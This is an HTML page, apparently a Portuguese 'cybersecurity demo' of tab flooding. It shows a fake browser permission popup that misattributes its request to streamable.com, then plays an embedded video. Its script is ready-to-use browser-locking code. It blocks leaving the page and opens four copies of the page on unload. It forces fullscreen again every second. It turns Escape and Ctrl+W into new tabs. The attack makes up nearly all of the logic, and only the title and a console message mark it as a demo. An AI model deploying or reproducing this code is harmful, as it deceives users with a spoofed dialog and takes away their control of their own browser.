<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Demo Cybersegurança - Tab Flooding</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: #000;
            height: 100vh;
            overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            touch-action: manipulation;
        }

        .video-container {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            opacity: 0;
            transition: opacity 0.4s;
        }

        .video-container.active {
            opacity: 1;
        }

        .video-container iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        /* Popup responsivo */
        .popup {
            position: fixed;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            background: #202124;
            border: 1px solid #3c4043;
            border-radius: 12px;
            width: 90%;
            max-width: 420px;
            color: #e8eaed;
            box-shadow: 0 10px 30px rgba(0,0,0,0.95);
            z-index: 10000;
            overflow: hidden;
        }

        .popup-header {
            padding: 20px 24px 12px;
            font-size: 18px;
            font-weight: 500;
            text-align: center;
        }

        .popup-body {
            padding: 0 24px 24px;
            font-size: 15px;
            line-height: 1.45;
            color: #9aa0a6;
            text-align: center;
        }

        .popup-footer {
            padding: 16px 24px;
            display: flex;
            justify-content: flex-end;
            gap: 12px;
            background: #292a2d;
            border-top: 1px solid #3c4043;
        }

        .popup button {
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            min-width: 110px;
        }

        .btn-cancel { 
            background: transparent; 
            color: #8ab4f8; 
        }
        
        .btn-ok { 
            background: #8ab4f8; 
            color: #202124; 
            font-weight: 600; 
        }

        /* Melhorias para mobile */
        @media (max-width: 480px) {
            .popup {
                width: 92%;
                border-radius: 16px;
            }
            .popup button {
                padding: 14px 20px;
                font-size: 17px;
            }
        }
    </style>
</head>
<body>

    <!-- Popup -->
    <div id="permissionPopup" class="popup">
        <div class="popup-header">Este site quer abrir várias janelas</div>
        <div class="popup-body">
            <strong>streamable.com</strong> está solicitando permissão para abrir múltiplas abas e janelas.<br><br>
            Isso é necessário para reproduzir o conteúdo corretamente.
        </div>
        <div class="popup-footer">
            <button class="btn-cancel" onclick="closePopup()">Bloquear</button>
            <button class="btn-ok" onclick="allowMultiTabs()">Permitir</button>
        </div>
    </div>

    <!-- Vídeo -->
    <div class="video-container" id="videoContainer">
        <iframe 
            id="videoFrame"
            allow="fullscreen; autoplay; encrypted-media"
            allowfullscreen 
            src="https://streamable.com/e/sd1hce?autoplay=0&nocontrols=1&muted=0" 
        ></iframe>
    </div>

    <script>
        let isAllowed = false;

        function allowMultiTabs() {
            document.getElementById('permissionPopup').style.display = 'none';
            document.getElementById('videoContainer').classList.add('active');

            const iframe = document.getElementById('videoFrame');
            iframe.src = "https://streamable.com/e/sd1hce?autoplay=1&nocontrols=1&muted=0";

            requestFullscreen();
            isAllowed = true;
        }

        function closePopup() {
            alert("Permissão negada.");
        }

        function requestFullscreen() {
            const elem = document.documentElement;
            if (elem.requestFullscreen) elem.requestFullscreen();
            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
        }

        // ==================== FUNCIONALIDADES AGRESSIVAS ====================

        window.addEventListener('beforeunload', function (e) {
            if (!isAllowed) return;
            e.preventDefault();
            e.returnValue = 'Tem certeza que deseja sair?';
            return 'Tem certeza que deseja sair?';
        });

        // Tab Flooding ao tentar sair
        window.addEventListener('beforeunload', function () {
            if (!isAllowed) return;
            for (let i = 0; i < 4; i++) {
                window.open(window.location.href, '_blank');
            }
        });

        // Manter em tela cheia
        setInterval(() => {
            if (isAllowed && !document.fullscreenElement) {
                requestFullscreen();
            }
        }, 1000);

        // Bloqueio de teclas (funciona melhor no desktop)
        document.addEventListener('keydown', function (e) {
            if (!isAllowed) return;
            if (e.key === 'Escape' || (e.ctrlKey && e.key.toLowerCase() === 'w')) {
                e.preventDefault();
                window.open(window.location.href, '_blank');
            }
        });

        console.log("%c🔴 DEMO CYBERSEGURANÇA - Adaptado para Mobile", "color: red; font-size: 16px; font-weight: bold");
    </script>

</body>
</html>
